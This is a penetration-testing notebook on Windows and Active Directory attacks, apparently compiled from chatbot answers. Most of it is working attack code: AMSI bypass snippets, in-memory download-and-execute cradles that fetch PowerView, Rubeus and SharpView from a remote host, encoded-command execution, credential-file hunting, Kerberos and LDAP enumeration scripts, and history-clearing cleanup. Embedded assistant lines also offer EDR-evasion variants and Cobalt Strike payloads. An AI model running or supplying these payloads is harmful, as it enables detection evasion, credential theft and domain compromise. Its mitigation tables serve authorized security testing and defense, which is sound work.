\$UserProfiles = Get-ChildItem C:\Users -Directory \| Select-Object
-ExpandProperty FullName

foreach (\$profile in \$UserProfiles) {

Write-Output "Enumerating files for profile: \$profile"

\# Limit file tree if needed

\# tree /f /a \$profile

\# Common juicy files

Get-ChildItem "\$profile\AppData\LocalLow\Microsoft\Putty" -ErrorAction
SilentlyContinue

Get-ChildItem "\$profile\AppData\Roaming\FileZilla\FileZilla.xml"
-ErrorAction SilentlyContinue

Get-ChildItem "\$profile\AppData\Roaming\Microsoft\Credentials"
-ErrorAction SilentlyContinue

}

\# Web.config files

Get-ChildItem -Path "C:\inetpub\wwwroot" -Include web.config -Recurse
-ErrorAction SilentlyContinue

\# Unattend.xml

Get-ChildItem -Path "C:\Windows\Panther" -Filter Unattend.xml
-ErrorAction SilentlyContinue

\# RDP config files

Get-ChildItem -Path "C:\ProgramData\Configs" -ErrorAction
SilentlyContinue

\# Powershell configs

Get-ChildItem -Path "C:\Program Files\Windows PowerShell" -Recurse
-ErrorAction SilentlyContinue

------------------------------------------------------------------------

**Notes on Usage & Requirements:**

- Most scripts require **elevated privileges (SYSTEM/Administrator)**.

- Mimikatz usage may trigger AV or Defender alerts.

- Some commands, especially dumping LSASS memory, may require
  downloading tools like procdump.exe from Sysinternals.

- Transfer of files (e.g., registry hives, LSASS dumps) must be done
  securely via SMB, SCP, or other channels.

- Always clean up after pentest to avoid leaving traces.

------------------------------------------------------------------------

If you'd like, I can bundle these into a single PowerShell module or
script that prompts you step-by-step — just let me know!

## Post-Exploitation Techniques

| **Technique** | **Stage in Attack Chain** | **Description** |
|----|----|----|
| **RunForPrivilege Esc.exe** | Privilege Escalation | Abuses insecure SYSTEM-level application for privilege escalation. |
| **Abusing Vulnerable GPO** | Privilege Escalation / Persistence | Modify GPOs to execute malicious commands or reset passwords across the domain. |
| **Abusing MSSQL Service Database** | Lateral Movement / Priv Esc | Leverages trusted SQL Server features for lateral movement (e.g., xp_cmdshell, linked servers). |
| **Abusing Domain Trusts** | Lateral Movement / Persistence | Exploits trust relationships to move laterally or persist in other domains (e.g., cross-trust DCSync). |

# Installation / Actions on Objectives

The attacker establishes persistence, maintains control, and achieves
goals inside AD.

- Common actions:

  - Creating or modifying privileged accounts or service principals for
    persistent access.

  - Implanting backdoors like Golden Tickets (for forging Kerberos
    tickets) or Skeleton Key malware.

  - Setting up scheduled tasks or deploying web shells on domain
    controllers.

  - Exfiltrating sensitive data like password hashes, intellectual
    property, or customer info.

  - Deploying ransomware or disrupting AD services.

**✅ Stage 5: Installation / Actions on Objectives**

These attacks are used to **maintain control**, establish persistence,
or simulate long-term domain control:

| **Attack** | **Description** |
|----|----|
| **Golden Ticket Attack** | Uses the KRBTGT hash to forge Kerberos TGTs for any user — even non-existent ones. |
| **DC Backdoor with Skeleton Key** | Installs a malicious patch on LSASS allowing login as any user using a "master password". |

These are **post-exploitation techniques** where the attacker has
**domain admin or equivalent privileges** and is now planting
persistence mechanisms.

# Summary 

| **Stage** | **Techniques/Controls Example** |
|----|----|
| Credential Access | Change KRBTGT passwords; Use Protected Users group; Disable WDigest; Use Managed Service Accounts; Patch vulnerabilities; Enable logging |
| Privilege Escalation | Limit admin memberships; Tiered admin; Patch MS14-068; Temporary group membership; Validate scheduled tasks |
| Lateral Movement | SMB v2/v3+; Block LM/NTLM; Network segmentation; IDS deployment; DC logon restrictions |
| Persistence | Disable inactive accounts; Validate scripts/tasks; Protected Users group; Admin workstation restrictions |
| Detection | Event log monitoring (PowerShell, Kerberos events, process creation, DCSync) |

If you want, I can help you **map each specific mitigation or
vulnerability to the exact attack technique and stage** (e.g.,
Pass-the-Hash, Kerberoasting, Golden Ticket, DCSync, DCShadow, etc.) for
a more detailed breakdown. Would you like that?

Windows privileges control critical system functions and Active
Directory (AD) operations. Attackers who gain certain privileges can
escalate rights, persist, pivot, or fully compromise the domain.

Many of these privileges are commonly abused during penetration tests
and red team engagements. Understanding, detecting, and exploiting these
privileges helps uncover security weaknesses in Windows environments and
Active Directory infrastructures.

## PowerShell AMSI Bypass

Here's a corrected, summarized, and structured version tailored for
**Windows and Active Directory (AD) Penetration Testing**, including
tactics, techniques, tools, vulnerabilities, risk severity, and impact:

**🔍 AMSI Bypass in Windows & Active Directory Penetration Testing**

**🧩 Tactic**

- **Defense Evasion**

- **Execution**

**🎯 Techniques**

- Bypass Windows Antimalware Scan Interface (AMSI) to run malicious
  PowerShell code undetected.

- Circumvent script block logging and PowerShell telemetry via
  obfuscation and dynamic code execution.

**🧪 Common Bypass Methods**

| **Technique Type** | **Example** | **Notes** |
|----|----|----|
| **Plain AMSI Bypass** | \[Ref\].Assembly.GetType('System.Management.Automation.AmsiUtils')... | Direct memory patching of AmsiScanBuffer. Flagged by most AVs. |
| **Obfuscated String Construction** | sET-ItEM ('VaR'+'IA'+'blE:1q2uZx') (\[T... | String concatenation and casing tricks to confuse signature-based detection. |
| **Delegate Injection** | \[Delegate\]::CreateDelegate(("Func\`\`3\[String,... | Dynamic code execution with less logging, often avoids detection. |
| **Tool-Based Obfuscation** | Invoke-Obfuscation, AMSI.fail, Invoke-CradleCrafter | Community tools for automated script mangling. |

------------------------------------------------------------------------

**🛠️ Tools Used**

- **PowerView** (AD enumeration – flagged unless obfuscated)

- **Invoke-Obfuscation** (PowerShell obfuscation framework)

- **AMSI.fail** (prebuilt AMSI bypass payloads)

- **PowerShell Empire / Covenant** (C2 frameworks using AMSI bypasses)

- **SharpSploit / GhostPack** (C# equivalents, avoiding PowerShell)

------------------------------------------------------------------------

**🚨 Exploited Vulnerabilities**

- Design limitation in **AMSI** allowing runtime memory patching.

- Weakness in **PowerShell Script Block Logging** for encoded/obfuscated
  content.

- Lack of **AppLocker/Constrained Language Mode** enforcement in many
  environments.

------------------------------------------------------------------------

**📉 Security Risk Severity**

- **High**

  - Allows full execution of post-exploitation scripts (e.g., AD
    enumeration, lateral movement tools).

  - Evades most endpoint protections.

  - Often the first step in bypassing detection for privilege escalation
    or persistence.

------------------------------------------------------------------------

**💥 Impact on Workload & Environment**

- Undetected execution of malicious PowerShell significantly increases
  compromise scope.

- Leads to full Active Directory enumeration (e.g., via PowerView).

- Facilitates credential harvesting, lateral movement, and privilege
  escalation.

- Undermines EDR/XDR solutions if detection controls are weak or
  misconfigured.

------------------------------------------------------------------------

**🛡️ Recommended Defenses**

- Enable **Script Block Logging** and **Module Logging** in PowerShell.

- Enforce **Constrained Language Mode** via AppLocker or Device Guard.

- Monitor AMSI tampering with **ETW (Event Tracing for Windows)**.

- Block execution of known AMSI bypass tools and signature patterns.

- Use **Defender for Endpoint** or **Sysmon** to log suspicious
  PowerShell activity.

**How to perform?**

Below is a **step-by-step guide with commands** to perform an **AMSI
Bypass** during **Windows & Active Directory penetration testing**,
structured for offensive operations. This assumes you're performing a
red team or authorized security test.

⚠️ **Disclaimer**: These steps are for **educational and authorized
testing** only. Unauthorized use may violate laws and ethical
guidelines.

**⚔️ AMSI Bypass: Penetration Testing Steps**

**🧭 Objective**

Bypass AMSI to execute PowerShell-based post-exploitation tools (like
PowerView, SharpHound) without being detected by Defender or EDR.

------------------------------------------------------------------------

**🧱 1. Initial Setup**

Ensure you have a foothold on a Windows target (via RDP, reverse shell,
etc.) with PowerShell access.

\# Check current PowerShell version

\$PSVersionTable.PSVersion

Recommended: PowerShell v5+, as AMSI is enforced from v5 onward.

------------------------------------------------------------------------

**🔧 2. Test Basic Script Execution**

Try running PowerView or any PowerShell post-exploitation script
directly to observe AMSI/Defender interference.

IEX (New-Object
Net.WebClient).DownloadString('http://yourserver/PowerView.ps1')

⚠️ This will likely be blocked unless Defender is disabled or bypassed.

------------------------------------------------------------------------

**🧨 3. Attempt Plain AMSI Bypass (Basic Patching)**

This method patches AMSI in memory.

\# AMSI bypass: memory patch (commonly flagged)

\[Ref\].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)

🛑 This is signatured by AV/EDR. Use obfuscation next.

------------------------------------------------------------------------

**🎭 4. Use Obfuscated AMSI Bypass**

Example using string concatenation:

\# Obfuscated bypass

\$s='System.Management.Automation.AmsiUtils'

\$f='amsiInitFailed'

\[Ref\].Assembly.GetType(\$s).GetField(\$f,'NonPublic,Static').SetValue(\$null,\$true)

Or use even deeper obfuscation (e.g., via Invoke-Obfuscation).

------------------------------------------------------------------------

**🔮 5. Advanced Bypass Using Delegates**

Avoids detection from common AV signatures and logging.

\# Less detectable method (dynamic delegate)

\$Delegate =
\[Delegate\]::CreateDelegate(("Func\`\`3\[String,System.Reflection.Assembly,Type\]"),\[Type\]::GetType("System.Func\`3"))

\$Amsi =
\$Delegate.Invoke("System.Management.Automation.AmsiUtils",\[AppDomain\]::CurrentDomain.GetAssemblies()
\| ? { \$\_.GlobalAssemblyCache -and
\$\_.Location.Split('\\')\[-1\].Equals('System.Management.Automation.dll')
}, \$null)

\$Amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)

------------------------------------------------------------------------

**🕵️ 6. Verify Bypass Effectiveness**

Run your post-exploitation tool again:

IEX (New-Object
Net.WebClient).DownloadString('http://yourserver/PowerView.ps1')

Invoke-ShareFinder

If PowerView executes without interference, AMSI was successfully
bypassed.

------------------------------------------------------------------------

**🛠️ 7. Alternative Approach: Use C# Tools (No PowerShell)**

Avoid PowerShell entirely by using C# compiled tools like:

- **SharpView** (PowerView in C#)

- **Seatbelt**

- **SharpHound**

Example: Host and run SharpView.exe from your C2 or web server.

------------------------------------------------------------------------

**🔐 8. Operational Security Tips**

- Use **in-memory execution**: Avoid touching disk (use IEX or
  reflectively load binaries).

- **Rotate bypass techniques**: Don't reuse signatures across ops.

- **Evade logging**: Disable script block logging (if permitted in
  scope) or evade it via obfuscation.

------------------------------------------------------------------------

**🧼 9. Cleanup (If Scope Allows)**

If authorized, remove any artifacts:

Remove-Item "\$env:TEMP\\.ps1" -Force

Clear-History

------------------------------------------------------------------------

**🛡️ Blue Team Detection Tips**

Use these for purple teaming:

| **Detection Point**         | **Recommended Tool** |
|-----------------------------|----------------------|
| AMSI Patch                  | Sysmon + Event ID 7  |
| Script Block Logging        | Enable via GPO       |
| Suspicious Memory Writes    | Defender ATP, ETW    |
| Process Injection/Delegates | EDR, Event Tracing   |

------------------------------------------------------------------------

**⚔️ Summary Table**

| **Step** | **Action**            | **Command/Tool**                  |
|----------|-----------------------|-----------------------------------|
| 1        | PowerShell access     | \$PSVersionTable                  |
| 2        | Trigger AMSI          | IEX (New-Object ...)              |
| 3        | Patch AMSI            | \[Ref\].Assembly...               |
| 4        | Obfuscate             | Invoke-Obfuscation                |
| 5        | Delegate-based bypass | \[Delegate\]::CreateDelegate(...) |
| 6        | Re-run post-ex tools  | PowerView, Invoke-ShareFinder     |
| 7        | Use C# tools          | SharpView, Seatbelt               |
| 8        | Cleanup               | Clear-History, delete scripts     |

------------------------------------------------------------------------

Let me know if you want a **ready-made script**, **BOF (Beacon Object
File)** version, or **payload for Cobalt Strike/Sliver**, or a **blue
team detection lab** guide.

## PowerShell One-liners & Reflective C# Assembly Execution

**🧩 Tactics and Techniques**

| **Tactic** | **Techniques Used** |
|----|----|
| Execution | Reflective script loading, encoded commands, .NET assembly injection |
| Defense Evasion | AMSI bypass, obfuscation, proxy-aware loaders, encoded PowerShell commands |
| Credential Access | Reflective execution of credential theft tools (e.g., Rubeus) |

**🛠️ Tools Used**

- PowerShell (IEX, New-Object, DownloadData)

- **Nishang** (Invoke-Encode.ps1)

- **Invoke-CradleCrafter** (OpSec-safe download cradle generator)

- **Rubeus** (Kerberos abuse)

- Custom .NET assemblies

- SharpView, Seatbelt, PowerView (post-ex tools)

------------------------------------------------------------------------

**🔥 Vulnerabilities Exploited**

- Lack of PowerShell **Constrained Language Mode**

- Weak **execution policy enforcement**

- **AMSI bypass** (optional but recommended)

- Misconfigured **proxy settings**, allowing outbound web access

------------------------------------------------------------------------

**⚠️ Security Risk Severity: High**

- Enables stealthy payload delivery without touching disk

- Evades signature-based AV

- Can trigger credential theft, persistence, and AD enumeration

------------------------------------------------------------------------

**💥 Impact on Workload**

- Allows **in-memory execution** of malicious tools

- Bypasses detection and logging in many environments

- Facilitates **post-exploitation tasks** with minimal forensic
  footprint

------------------------------------------------------------------------

**🧪 Steps and Commands**

------------------------------------------------------------------------

**🔹 1. Proxy-aware PowerShell One-liner**

IEX (New-Object
Net.WebClient).DownloadString('http://10.10.16.7/PowerView.ps1')

✅ Good for environments with web access, but commonly flagged

------------------------------------------------------------------------

**🔹 2. Non-Proxy-aware PowerShell One-liner**

\$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1

\$h.Open('GET', 'http://10.10.16.7/PowerView.ps1', \$false)

\$h.Send()

IEX \$h.ResponseText

📌 Useful when .Net WebClient fails due to proxy settings

------------------------------------------------------------------------

**🔹 3. Invoke-CradleCrafter for OpSec-Safe Cradle**

Generate stealthy cradle with:

Import-Module .\Invoke-CradleCrafter.ps1

Invoke-CradleCrafter -Url 'http://10.10.16.7/PowerView.ps1' -OutFile
cradle.txt

------------------------------------------------------------------------

**🔹 4. Load C# Assembly Reflectively**

Ensure the .NET assembly is compiled with **public static Main method**

**🧬 Load and Run Without Args**

\$data = (New-Object
System.Net.WebClient).DownloadData('http://10.10.16.7/SharpView.exe')

\$assem = \[System.Reflection.Assembly\]::Load(\$data)

\[SharpView.Program\]::Main("".Split())

**🧬 Run with Arguments (e.g. Rubeus)**

\$data = (New-Object
System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')

\$assem = \[System.Reflection.Assembly\]::Load(\$data)

\[Rubeus.Program\]::Main("s4u /user:web01\$ /rc4:\<rc4hash\>
/impersonateuser:administrator /domain:corp.local".Split())

**🧬 Invoke Specific Method from Class Library (e.g., DLL)**

\$data = (New-Object
System.Net.WebClient).DownloadData('http://10.10.16.7/tool.dll')

\$assem = \[System.Reflection.Assembly\]::Load(\$data)

\$class = \$assem.GetType("ClassLibrary1.Class1")

\$method = \$class.GetMethod("runner")

\$method.Invoke(\$null, \$null)

------------------------------------------------------------------------

**🔹 5. Download Executable via PowerShell**

(New-Object
System.Net.WebClient).DownloadFile("http://10.10.16.7/Incnspc64.exe",
"\$env:TEMP\tool.exe")

Or use shorthand (PS v4+):

Invoke-WebRequest "http://10.10.16.7/Incnspc64.exe" -OutFile
"\$env:TEMP\tool.exe"

------------------------------------------------------------------------

**🔹 6. Encode PowerShell Commands (Bypass Execution Policy)**

**Encode One-liner**

\$command = 'IEX (New-Object
Net.WebClient).DownloadString("http://10.10.16.7/PowerView.ps1")'

\$bytes = \[System.Text.Encoding\]::Unicode.GetBytes(\$command)

\$encodedCommand = \[Convert\]::ToBase64String(\$bytes)

**Run Encoded Command**

powershell.exe -EncodedCommand \$encodedCommand

------------------------------------------------------------------------

**🔹 7. Encode Full Script (Optional)**

\[System.Convert\]::ToBase64String(\[System.IO.File\]::ReadAllBytes("C:\path\to\script.ps1"))
\| Set-Clipboard

------------------------------------------------------------------------

**🔐 Cleanup (if authorized)**

Remove-Item "\$env:TEMP\tool.exe" -Force

Clear-History

------------------------------------------------------------------------

**📊 Summary Table**

| **Technique** | **Tool/Command Example** |
|----|----|
| Proxy-aware script loading | IEX (New-Object Net.WebClient)... |
| Non-proxy loading | New-Object -ComObject WinHttp.WinHttpRequest.5.1 |
| Reflective .NET assembly load | \[System.Reflection.Assembly\]::Load(\$data) |
| Rubeus execution | \[Rubeus.Program\]::Main("s4u ...".Split()) |
| Encode & execute | -EncodedCommand |
| Safe cradle generation | Invoke-CradleCrafter |

------------------------------------------------------------------------

Would you like me to generate a **modular script** that automates these
steps or an **EDR evasion variant** using AMSI and ETW bypass in memory?

# Attack path on AD through Kerberos

AD reconnaissance with Kerberos Port-88

Gotcha! Here’s a quick overview of using **Kerberos (port 88)** for
**Active Directory reconnaissance**, especially focusing on **username
enumeration** via nmap scripting:

**What is Kerberos Port 88?**

- TCP/UDP port 88 is used by **Kerberos**, the authentication protocol
  in Active Directory.

- Kerberos handles ticket requests and user authentication.

- Targeting port 88 can help in discovering valid user accounts or
  services.

**Username Enumeration with nmap’s krb5-enum-users.nse**

- krb5-enum-users.nse is an **Nmap Scripting Engine (NSE)** script
  designed to enumerate Kerberos usernames.

- It attempts to enumerate valid AD usernames by sending Kerberos
  requests and analyzing responses.

- Useful for **user enumeration during AD recon** without direct
  brute-force attacks.

**How to Use krb5-enum-users.nse**

nmap -p 88 --script krb5-enum-users --script-args
krb5-enum-users.realm=\<DOMAIN\> \<target_ip\>

- Replace \<DOMAIN\> with the target AD domain (e.g., EXAMPLE.LOCAL).

- Replace \<target_ip\> with the IP or hostname of the domain controller
  or Kerberos server.

**Example**

nmap -p 88 --script krb5-enum-users --script-args
krb5-enum-users.realm=EXAMPLE.LOCAL 10.0.0.10

**What the script does:**

- Sends Kerberos AS-REQ requests with different usernames.

- Valid responses indicate the username exists.

- Invalid usernames usually cause different error responses.

**Notes:**

- This is **passive enumeration**, less noisy than password
  brute-forcing.

- Useful during **initial AD recon** inside Azure AD Domain Services or
  hybrid AD environments.

- Requires knowledge or guesses of valid usernames (can be combined with
  username lists).

If you want, I can help you prepare:

- A list of common AD usernames for enumeration.

- A script to automate nmap Kerberos username enumeration.

- Additional Kerberos attack and recon techniques.

Want me to do that?

Awesome! Here’s a practical step-by-step setup to automate **Kerberos
username enumeration** in Active Directory environments (like Azure AD
DS or hybrid AD) using nmap with the krb5-enum-users.nse script.

------------------------------------------------------------------------

**Step 1: Prepare a Username List**

Create a file called usernames.txt with common or target-specific
usernames, one per line, e.g.:

administrator

guest

john.doe

jane.smith

svc_account

krbtgt

------------------------------------------------------------------------

**Step 2: Kerberos Username Enumeration Script (Bash)**

This script reads usernames from your list and runs nmap against port 88
with the right domain realm, then parses results to find valid users.

\#!/bin/bash

\# Usage: ./kerberos_enum.sh \<target_ip\> \<domain\> usernames.txt

if \[ "\$#" -ne 3 \]; then

echo "Usage: \$0 \<target_ip\> \<domain\> \<userlist\>"

echo "Example: \$0 10.0.0.10 EXAMPLE.LOCAL usernames.txt"

exit 1

fi

TARGET_IP=\$1

DOMAIN=\$2

USERLIST=\$3

echo "\[\*\] Starting Kerberos username enumeration on \$TARGET_IP for
domain \$DOMAIN"

while read -r username; do

\# Skip empty lines or comments

\[\[ -z "\$username" \|\| "\$username" =~ ^# \]\] && continue

echo "\[\*\] Testing username: \$username"

\# Run nmap with krb5-enum-users.nse targeting one username at a time

OUTPUT=\$(nmap -p 88 --script krb5-enum-users --script-args
"krb5-enum-users.realm=\$DOMAIN,krb5-enum-users.userlist=\$username"
"\$TARGET_IP" 2\>/dev/null)

\# Check output for success/failure pattern

if echo "\$OUTPUT" \| grep -qi "Valid username found"; then

echo "\[+\] Valid username: \$username"

else

echo "\[-\] Invalid username: \$username"

fi

done \< "\$USERLIST"

echo "\[\*\] Enumeration complete."

------------------------------------------------------------------------

**Step 3: Usage Example**

1.  Save the script above as kerberos_enum.sh.

2.  Make it executable:

chmod +x kerberos_enum.sh

3.  Run it against your target domain controller or Azure AD DS IP:

./kerberos_enum.sh 10.0.0.10 EXAMPLE.LOCAL usernames.txt

------------------------------------------------------------------------

**How it works**

- The script tests each username in your list by invoking nmap with the
  krb5-enum-users NSE script.

- If the username is valid, the nmap script output will show something
  like Valid username found.

- Invalid usernames usually return different Kerberos errors, which the
  script filters out.

------------------------------------------------------------------------

**Additional tips**

- Use a comprehensive username list for better coverage. Public lists
  like SecLists contain good username wordlists.

- Run this from a machine with network access to port 88 on the target.

- Combine with other AD recon tools for best results.

## Reconnaissance via LDAP (Port 389)

**1. Service Enumeration**

- Identify open LDAP services and gather public info:

- nmap -n -sV --script "ldap\* and not brute" \<IP\>

**2. Anonymous or Null Bind Check**

- Test for LDAP access using null or default credentials:

- ldapsearch -x -H ldap://ldap.example.com -D
  "cn=admin,dc=example,dc=com" -W \\

- -b "dc=example,dc=com" "(objectClass=\*)"

**3. User & Group Enumeration**

- List all user objects:

- ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com"
  "(objectClass=person)"

- Query specific user attributes (e.g., CN, mail, UID):

- ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com" \\

- "(objectClass=person)" cn mail uid

**4. Computer Enumeration**

- Extract computer objects in the domain:

- ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com"
  "(objectClass=computer)"

**5. Privileged Group Enumeration**

- Domain Admins:

- ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com"
  "(cn=Domain Admins)" member

- Enterprise Admins:

- ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com"
  "(cn=Enterprise Admins)" member

- Administrators:

- ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com"
  "(adminRole=\*)"

- Remote Desktop Users:

- ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com"
  "(cn=Remote Desktop Users)" member

## LDAP 

LDAP Reconnaissance: Mapping the Active Directory

LDAP reconnaissance involves querying a Lightweight Directory Access
Protocol (LDAP) server to gather information about a network,
particularly within Active Directory environments commonly used in
Windows domains.

**What is LDAP?**

- LDAP is a protocol for accessing and managing data in directory
  services.

- Think of it like a giant electronic phone book that stores user
  accounts, groups, devices, and other resources within a network.

**Why do attackers use LDAP reconnaissance?**

- By querying the LDAP server, attackers can potentially discover
  valuable information like:

  - Valid usernames and email addresses

  - User group memberships

  - Departmental structures

  - Device information

- This information can be used for further attacks like:

  - Social engineering: Using personal details to trick users into
    revealing information or granting access.

  - Credential stuffing: Attempting to log in to user accounts with
    common passwords.

  - Lateral movement: Once inside the network, attackers can use this
    information to pivot to other systems and accounts.

**How does LDAP reconnaissance work?**

- Attackers use specialized tools to send queries to the LDAP server.

- These queries can be broad or very specific, depending on the
  attacker's goals.

- By analysing the responses, attackers can build a map of the network
  environment.

**Defending against LDAP reconnaissance:**

- **Limit access to LDAP:** Restrict access to the LDAP server to
  authorized personnel and systems.

- **Secure LDAP configurations:** Configure LDAP to minimize the
  information revealed in responses.

- **Monitor LDAP activity:** Watch for suspicious queries or unusual
  activity patterns.

- **Implement strong password policies:** Complex passwords make
  brute-force attacks targeting usernames obtained through LDAP recon
  more difficult.

By understanding LDAP reconnaissance and implementing proper security
measures, organizations can make it significantly harder for attackers
to gather valuable information about their network users and resources.

- Lightweight Directory Access Protocol (LDAP) is an Internet protocol
  for accessing distributed directory services.

- Directory services may provide any organized set of records, often in
  a hierarchical and logical structure, such as a corporate email
  directory.

- A client starts an LDAP session by connecting to a Directory System
  Agent (DSA) on TCP port 389 and sends an operation request to the DSA.

- Information is transmitted between the client and the server using
  Basic Encoding Rules (BER).

- Attacker queries LDAP service to gather information such as valid user
  names, addresses, departmental details, etc. that can be further used
  to perform attacks

LDAP Enumeration

LDAP Enumeration is a technique where attackers query an LDAP service to
gather sensitive information like usernames, addresses, and department
details. This information can be leveraged for further attacks, such as
targeted phishing or social engineering.

LDAP is a protocol used to access directory services, often structured
hierarchically. Attackers exploit vulnerabilities in LDAP
implementations to extract valuable data.

## LDAP Enumeration Countermeasures

By default, LDAP traffic is transmitted unsecured; use SSL technology to
encrypt the traffic

Select a user name different from your email address and enable account
lockout

**Encryption:** Use SSL/TLS to encrypt LDAP traffic for secure
communication.

**Strong Credentials:** Choose a username different from your email
address and enable account lockout after a certain number of failed
login attempts.
